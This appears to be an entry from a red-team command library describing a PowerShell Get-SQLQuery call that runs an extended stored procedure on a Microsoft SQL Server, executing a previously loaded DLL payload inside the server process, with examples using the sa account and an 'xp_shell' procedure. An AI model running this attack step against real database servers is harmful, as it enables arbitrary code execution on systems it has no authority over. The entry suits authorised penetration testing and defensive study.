---
id: 90ad1b2f-c4ea-414a-8b93-a264385c8246
name: execute-extended-stored-procedure-xp-test
type: command
executor: powershell
data: >-
  Get-SQLQuery -UserName $_USERNAME -Password $_PASSWORD -Instance "$_INSTANCE"
  -Query "EXEC $_PROC_NAME"
output: null
created_at: '2023-04-06T03:56:20.295483+00:00'
updated_at: '2023-04-10T20:36:30.722000+00:00'
platforms:
  - Windows
tags:
  - mssql
  - execution
verified: true
validated: true
---

# execute-extended-stored-procedure-xp-test

## Command

```powershell
Get-SQLQuery -UserName $_USERNAME -Password $_PASSWORD -Instance "$_INSTANCE" -Query "EXEC $_PROC_NAME"
```

## Description

This command invokes an extended stored procedure on the MSSQL instance, executing the associated DLL payload in the SQL Server process context.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -UserName ($__USERNAME) | SQL Server username (e.g., sa) | Yes |
| -Password ($__PASSWORD) | SQL Server password | Yes |
| -Instance ($__INSTANCE) | Target SQL Server instance (e.g., DBSERVERNAME\SQLEXPRESS) | Yes |
| -Query | The SQL command to execute the procedure | Built-in |
| $_PROC_NAME | Name of the procedure to run (e.g., xp_test) | Yes |

## Examples

### Basic Usage

```powershell
Get-SQLQuery -UserName sa -Password Password1234 -Instance "DBSERVERNAME\SQLEXPRESS" -Query "EXEC xp_test"
```

### Advanced Usage

```powershell
Get-SQLQuery -UserName sa -Password Password1234 -Instance "DBSERVERNAME\SQLEXPRESS" -Query "EXEC xp_shell"
```

## Expected Output

Depends on the payload; for a simple echo command, it may return empty or a success message. Errors like "Could not find stored procedure 'xp_test'" indicate failure. Verify payload effects (e.g., file creation) separately.

## Related

- [[procedures/mssql-server-extended-stored-procedure-dll-injection]]
- [[commands/load-dll-as-extended-procedure]]
